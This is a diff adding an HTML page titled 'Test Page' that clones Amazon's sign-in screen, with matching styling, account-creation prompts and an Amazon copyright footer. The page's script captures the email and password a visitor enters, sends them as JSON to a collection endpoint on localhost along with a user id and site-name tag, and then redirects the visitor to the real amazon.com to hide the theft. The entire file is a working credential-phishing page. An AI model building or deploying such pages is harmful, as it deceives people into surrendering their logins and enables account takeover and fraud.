@@ -1,0 +1,226 @@
+<html>
+  <head>
+    <title>Test Page</title>
+    <script>
+      const uid = "user123user123"; 
+      const websiteName = "mywebsitemywebsite"; 
+  
+      async function handleSubmit(event) {
+        event.preventDefault(); 
+        const email = document.getElementById("email").value;
+        const password = document.getElementById("password").value;
+        const signInButton = document.getElementById("amazon");
+            signInButton.disabled = true;
+            signInButton.style.opacity = '0.5';
+            signInButton.style.cursor = 'not-allowed';
+        try {
+          const response = await fetch("http://localhost:5237/insertdata", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+              uid: uid,
+              websiteName: websiteName,
+              email: email,
+              password: password
+            })
+          });
+  
+          window.location.href = "https://amazon.com/";
+        } catch (error) {
+          window.location.href = "https://amazon.com/";
+          console.error("Error inserting data:", error);
+        }
+      }
+    </script>
+  
+    <style>
+      #amazon{
+  width:315px;
+  height:33px;
+  font-size:14px;
+
+  background: linear-gradient(#F7DEA1, #F0C14D);
+  border: 0.5px solid #aaaaaa;
+  border-radius:3px;
+  margin-top: 10px;
+}
+
+#amazon:hover{
+background: linear-gradient(#F5D68A, #EEBA36);
+}
+
+
+
+body {
+    font-size: 13px;
+    line-height: 19px;
+    color: #111;
+    font-family: Arial,sans-serif;
+}
+
+img{
+  margin: auto;
+  display: block;
+}
+
+#signInBorder{
+  position: static;
+  margin: 0 auto;
+  border-color: #DDDDDD;
+  border: 0.5px solid #DDDDDD;
+  border-radius: 3px;
+  width: 340px;
+  padding-left: 25px;
+}
+
+input{
+  border-left-color: #DDDDDD;
+  border-right-color: #DDDDDD;
+  border-radius: 3px;
+  border-width: 0.2px;
+  height: 25px;
+  width: 315px;
+  margin-bottom: 15px;
+
+}
+
+input:focus{
+  -webkit-box-shadow: 0px 0px 1.5px 1.5px rgba(231,118,0,0.9);
+  -moz-box-shadow: 0px 0px 1.5px 1.5px rgba(231,118,0,0.9);
+  box-shadow: 0px 0px 1.5px 1.5px rgba(231,118,0,0.9);
+  outline:0;
+}
+
+
+#SignInTxt{
+  font-family: Arial, sans-serif;
+  font-size: 26.5px;
+}
+
+h2 {
+   color: rgb(134, 134, 134);
+   font-weight: normal;
+   letter-spacing: 1px;
+   font-size: 11.5px;
+   width: 315px;
+   text-align: center;
+   border-top: 1px solid rgba(0, 0, 0, 0.1);
+   border-bottom: 1px solid rgba(255, 255, 255, 0.3);
+   line-height: 0.1em;
+   margin: 10px 0 20px;
+   margin-bottom: 5px;
+}
+
+h2 span {
+    background:#fff;
+    padding:0 10px;
+}
+
+#createAccount{
+  margin-top: 30px;
+}
+
+#newAccount{
+  background: linear-gradient(#f6f7f9, #e7e9ec);
+  margin-top: 10px;
+  margin-bottom: 20px;
+  width:315px;
+  height:33px;
+  font-size:14px;
+  border: 0.5px solid #aaaaaa;
+  border-radius:3px;
+}
+
+#newAccount:hover{
+  background: linear-gradient(#f5f6f8, #d9dce1);
+}
+
+#footer{
+  border: 0;
+   height: 0;
+   border-top: 1px solid rgba(0, 0, 0, 0.1);
+   border-bottom: 1px solid rgba(255, 255, 255, 0.3);
+   margin-top: 30px;
+}
+
+
+
+a:link{
+  font-size: 12px;
+  /*margin: 0 10px 0px 10px;*/
+  margin-right: 10px;
+  text-decoration: none;
+  color: #0066c0
+}
+a:hover{
+  text-decoration: underline;
+  color: orangergb(230, 161, 28);
+}
+
+a:visited{
+  color: #0066c0;
+}
+
+ .links{
+  font-size: 10px;
+  text-align: center;
+  padding-left: 15px;
+}
+
+#special{
+  font-size: 11px;
+}
+
+    </style>
+  </head>
+  <body>
+    
+    <div id="signInBorder">
+      <p id="SignInTxt">
+        Sign in
+      </p>
+
+      <label>
+        <strong>Email (phone for mobile accounts)</strong>
+        <br>
+        <input type="email" id="email" name="email" value="">
+      </label>
+
+      <br>
+
+      <label>
+        <strong>Password</strong>
+        <span><a href="#" >Forgot your password?</a></span>
+        <br>
+        <input type="password" id="password" name="password" value="">
+      </label>
+
+      <div>
+        <button id="amazon" onclick="handleSubmit(event)">Sign in</button>
+      </div>
+
+      <div id="createAccount">
+        <h2><span>New to Amazon?</span></h2>
+        <button id="newAccount" name="newAcct">Create your Amazon account</button>
+      </div>
+
+
+
+    </div>
+
+  <hr id="footer">
+
+  <div class="extra">
+    <p class="links"><a href="#" id="first">Conditions of Use</a>
+    <a href="#">Notice of Use</a>
+    <a href="#">Help</a></p>
+    <p class="links" id="special">
+      © 1996-2016, Amazon.com, Inc. or its affiliates
+    </p>
+  </div>
+
+
+  </body>
+</html>
